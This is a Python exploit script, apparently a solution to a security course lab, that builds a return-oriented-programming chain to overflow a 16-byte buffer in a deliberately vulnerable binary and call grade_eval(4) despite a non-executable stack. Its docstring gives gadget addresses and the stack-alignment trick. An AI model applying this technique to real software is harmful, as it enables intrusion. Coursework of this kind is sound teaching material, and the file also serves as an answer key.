#!/usr/bin/env python3
"""Lab3 Task 3 -- dark-calc-nx: ROP chain that calls grade_eval(4).

dark-calc-nx has an NX stack (GNU_STACK is RW) and a random stack address,
so Task 2's trick is gone.  What is still true:

  * the binary is non-PIE, so .text always sits at its link-time address;
  * input() still copies an unbounded string into expression[16], and the
    saved return address is 24 bytes above the buffer.

So instead of writing new code we assemble our "program" out of instructions
that already exist in .text, chained through `ret` (return-oriented
programming).  The frame layout is identical to Task 1:

    expression[16] | padding[8] | saved rbp | return address

Chain (all gadgets are inside 0x4019d0..0x401ae3, i.e. __libc_csu_init,
as the lab hints; they are jumped into at unaligned offsets on purpose):

    0x401a33   pop rdi ; ret      -- 2 bytes inside `pop r15 ; ret`
    4          argument of grade_eval
    0x4017d1   ret                -- alignment fix (see below)
    0x401978   grade_eval         -- prints "Hope A will be your grade!"
    0x4017d1   ret                -- alignment fix for main()
    0x4019b4   main               -- stdin at EOF -> input() -> exit(0)

Alignment matters: input()'s `ret` leaves %rsp == buffer + 32 and the buffer
is 16-byte aligned, so we start at %rsp % 16 == 0, while a function must be
entered with %rsp % 16 == 8.  Each `pop rdi ; ret` moves %rsp by 16 and thus
keeps the parity, so a bare `ret` gadget is inserted right before every
function we jump to; otherwise glibc's printf() dies on a movaps.
"""

import struct
import sys

BUF_TO_RET = 24  # 16-byte buffer + 8-byte saved rbp

POP_RDI_RET = 0x401A33  # pop rdi ; ret  (inside __libc_csu_init's epilogue)
RET = 0x4017D1  # plain `ret`
GRADE_EVAL = 0x401978
MAIN = 0x4019B4


def p64(value):
    return struct.pack("<Q", value)


payload = b"".join(
    [
        b"A" * BUF_TO_RET,
        p64(POP_RDI_RET),  # -> return address
        p64(4),  # pop rdi ; ret
        p64(RET),  # alignment
        p64(GRADE_EVAL),  # grade_eval(4)
        p64(RET),  # alignment
        p64(MAIN),  # back to main(): EOF -> input() -> exit(0)
    ]
)

assert b"\n" not in payload

sys.stdout.buffer.write(payload)
